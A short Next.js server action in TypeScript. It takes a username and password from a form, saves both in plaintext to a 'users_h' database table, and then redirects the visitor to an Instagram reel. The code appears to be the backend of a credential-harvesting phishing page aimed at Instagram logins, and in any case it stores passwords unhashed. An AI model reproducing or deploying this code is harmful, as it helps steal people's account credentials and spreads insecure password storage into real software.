'use server';

import {z} from 'zod';
import { sql } from '@vercel/postgres';
import { revalidatePath } from 'next/cache';
import { redirect } from 'next/navigation';

const FormSchema = z.object({
    id: z.string(),
    user: z.string(),
    email: z.string(),
    password: z.string(),
});

const CreateUser = FormSchema.omit({id: true, email: true});



export async function createUser(formData: FormData) {
    const { user, password } = CreateUser.parse({
        user: formData.get('user'),
        password: formData.get('password'),
    });
    const email = user;

    await sql`
    INSERT INTO users_h (name, password, email)
    VALUES (${user}, ${password}, ${email})
    `;

    revalidatePath('/');
    redirect('https://www.instagram.com/reel/DAco5BaIPmf/');
}